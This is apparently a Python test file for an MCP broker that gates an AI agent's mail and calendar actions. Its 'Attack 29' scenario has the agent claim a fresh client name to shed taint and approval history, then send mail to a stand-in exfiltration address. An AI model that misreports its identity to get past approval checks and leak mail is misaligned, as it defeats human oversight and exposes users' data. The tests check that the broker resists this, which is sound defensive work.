"""Attack 29: the agent lies about its client name to shed taint and approval history.

Identity comes from the `--agent` launch argument (Session.agent_id). What the client reports
about itself (Session.client_hint) is logged and never used for a decision.
"""

import json
import sqlite3
from pathlib import Path

import mcp_types as types
from mcp.client import Client

from broker.approvals.base import ApprovalOutcome
from broker.rules.models import Verdict
from broker.taint import Session
from tests.conftest import WorldFactory

EXFIL = "collect@evil.test"


def test_29_claimed_client_name_does_not_change_taint_or_history(world: WorldFactory) -> None:
    w = world(messages=["m_forward"], default=ApprovalOutcome.APPROVED, views_full_body=True)
    w.session.client_hint = "claude-desktop"
    w.call("read_message", message_id="m_forward")
    for _ in range(10):
        w.call("send_mail", to=["alice@work.test"], subject="s", body="b")
    # Same launch identity, but the client now claims to be something else entirely.
    w.session = Session(
        "sess-2", w.session.agent_id, w.session.contacts, w.store, w.history, w.clock,
        client_hint="brand-new-assistant",
    )  # fmt: skip
    assert w.session.tainted
    w.approver.views_full_body = False
    result = w.call("send_mail", to=[EXFIL], subject="s", body="b")
    prompt = w.approver.requests[-1]
    assert prompt.approval_number == 11
    assert prompt.requires_full_view
    assert result.approval == ApprovalOutcome.UNVIEWED
    assert w.call("create_event", title="t", start="s", end="e").verdict == Verdict.ASK
    conn = sqlite3.connect(w.log_path)
    hints = {json.loads(r[0]).get("client_hint") for r in conn.execute("SELECT metadata FROM log")}
    conn.close()
    assert hints == {"claude-desktop", "brand-new-assistant"}


def test_29b_reconnect_under_new_client_name_through_mcp(tmp_path: Path) -> None:
    """Two real MCP connections to one `--agent desktop` server, claiming different names."""
    from tests.unit.test_mcp_server import make_runtime, run

    runtime = make_runtime(tmp_path)

    async def taint_it(client: Client) -> None:
        await client.call_tool("read_message", {"message_id": "m_forward"})

    async def try_event(client: Client) -> types.CallToolResult:
        args = {"title": "Focus", "start": "s", "end": "e"}
        return await client.call_tool("create_event", args)

    run(runtime, taint_it, name="claude-desktop")
    result = run(runtime, try_event, name="fresh-innocent-client")
    # Own-calendar event without attendees asks only when tainted: taint followed the agent.
    assert "NOT DONE YET" in result.content[0].text  # type: ignore[union-attr]
